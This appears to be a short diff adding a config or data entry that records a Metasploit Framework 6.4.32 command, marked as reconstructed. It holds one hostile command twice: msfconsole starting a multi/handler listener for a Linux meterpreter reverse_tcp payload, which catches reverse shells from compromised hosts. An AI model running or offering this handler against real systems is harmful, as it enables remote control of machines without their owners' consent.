@@ -1,0 +1,8 @@
+tool = "metasploit-framework"
+version = "6.4.32"
+command = "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; run'"
+source = "nachgestellt"
+
+[unit]
+kind = "command"
+cmd = "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; run'"
